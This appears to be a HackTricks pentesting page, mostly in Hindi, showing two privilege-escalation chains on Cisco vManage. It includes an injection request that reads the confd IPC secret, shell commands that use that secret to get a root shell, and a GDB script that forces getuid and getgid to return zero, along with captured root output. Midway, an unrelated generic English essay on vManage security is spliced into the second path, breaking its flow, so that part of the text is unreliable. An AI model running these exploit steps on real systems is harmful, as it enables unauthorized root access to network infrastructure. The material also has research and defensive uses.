# सिस्को - vmanage

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family) का पता लगाएं
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>

## पथ 1

(उदाहरण [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) से)

कुछ [दस्तावेज़ीकरण](http://66.218.245.39/doc/html/rn03re18.html) के माध्यम से `confd` और विभिन्न बाइनरी (सिस्को वेबसाइट पर खाता होने पर पहुंचने योग्य) के संबंध में थोड़ा खोजने के बाद, हमने पाया कि IPC सॉकेट को प्रमाणित करने के लिए, यह `/etc/confd/confd_ipc_secret` में स्थित एक गुप्त उपयोग करता है:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
आपको हमारे Neo4j इंस्टेंस को याद है? यह `vmanage` उपयोगकर्ता की अनुमतियों के तहत चल रहा है, इसलिए हमें पिछली कमजोरी का उपयोग करके फ़ाइल प्राप्त करने की अनुमति होती है:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` कार्यक्रम कमांड लाइन तर्कों का समर्थन नहीं करता है लेकिन `/usr/bin/confd_cli_user` को तर्कों के साथ कॉल करता है। इसलिए, हम अपने खुद के तर्कों के साथ `/usr/bin/confd_cli_user` को सीधे कॉल कर सकते हैं। हालांकि, यह हमारी मौजूदा विशेषाधिकारों के साथ पठनीय नहीं है, इसलिए हमें रूटएफएस से इसे पुनः प्राप्त करना होगा और scp का उपयोग करके इसे कॉपी करना होगा, मदद पढ़ना होगा, और इसका उपयोग करके शेल प्राप्त करना होगा:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## मार्ग 2

(उदाहरण [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77) से)

साइनैक्टिव टीम द्वारा लिखित ब्लॉग¹ में एक सुंदर तरीका बताया गया है जिससे रूट शेल प्राप्त किया जा सकता है, लेकिन इसका एक नुकसान है कि इसके लिए `/usr/bin/confd_cli_user` की प्रतिलिपि प्राप्त करनी होती है जो केवल रूट द्वारा पढ़ी जा सकती है। मैंने एक और तरीका खोजा है जिससे रूट तक उन्नति हो सकती है।

जब मैंने `/usr/bin/confd_cli` बाइनरी को डिसअसेंबल किया, तो मैंने निम्नलिखित को देखा:
```
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
जब मैं "ps aux" चलाता हूँ, मैंने निम्नलिखित देखा (_नोट -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
मैंने "confd\_cli" प्रोग्राम के द्वारा एकत्रित किए गए उपयोगकर्ता ID और समूह ID को "cmdptywrapper" एप्लिकेशन को पास करते होने का संकल्प बनाया।

मेरा पहला प्रयास "cmdptywrapper" को सीधे चलाने और इसे `-g 0 -u 0` सप्लाई करना था, लेकिन यह विफल हुआ। ऐसा लगता है कि कहीं न कहीं एक फ़ाइल डेस्क्रिप्टर (-i 1015) बनाया गया था और मैं इसे नकली नहीं कर सकता।

सिनैक्टिव के ब्लॉग में उल्लिखित तरीके के अनुसार, "confd_cli" प्रोग्राम कमांड लाइन तर्क का समर्थन नहीं करता है, लेकिन मैं इसे एक डिबगर के साथ प्रभावित कर सकता हूँ और भाग्य से इस सिस्टम में GDB शामिल है।

मैंने एक GDB स्क्रिप्ट बनाया है जहां मैंने API `getuid` और `getgid` को 0 लौटाने के लिए मजबूर किया है। क्योंकि मेरे पास पहले से ही "vmanage" विशेषाधिकार हैं जिन्हें अविकलनीकरण RCE के माध्यम से प्राप्त किया गया है, मुझे सीधे `/etc/confd/confd_ipc_secret` को पढ़ने की अनुमति है।

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
# Cisco vManage

## Introduction

Cisco vManage is a cloud-based network management platform that provides centralized control and monitoring of Cisco SD-WAN devices. It allows network administrators to configure, monitor, and troubleshoot their SD-WAN infrastructure from a single interface.

## Privilege Escalation

In some cases, it may be possible to escalate privileges on a Cisco vManage instance to gain unauthorized access or perform unauthorized actions. This can be achieved through various methods, such as exploiting vulnerabilities, misconfigurations, or weak authentication mechanisms.

### Exploiting Vulnerabilities

If a Cisco vManage instance is running a vulnerable version of software, an attacker can exploit known vulnerabilities to gain unauthorized access or escalate privileges. It is important to keep the vManage software up to date and apply security patches regularly to mitigate the risk of exploitation.

### Misconfigurations

Misconfigurations in the vManage instance can also lead to privilege escalation. For example, if the vManage instance is configured with weak or default credentials, an attacker can easily gain unauthorized access. It is important to ensure that strong and unique passwords are used for all accounts on the vManage instance.

### Weak Authentication Mechanisms

Weak authentication mechanisms, such as the use of weak encryption algorithms or the absence of multi-factor authentication, can also be exploited to escalate privileges on a Cisco vManage instance. It is important to enforce strong authentication mechanisms and regularly review and update the security settings of the vManage instance.

## Conclusion

Privilege escalation on a Cisco vManage instance can lead to unauthorized access and compromise the security of the SD-WAN infrastructure. It is important to follow best practices for securing the vManage instance, including keeping the software up to date, configuring strong authentication mechanisms, and regularly reviewing and updating the security settings.
```
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud)** को PR जमा करके साझा करें।

</details>
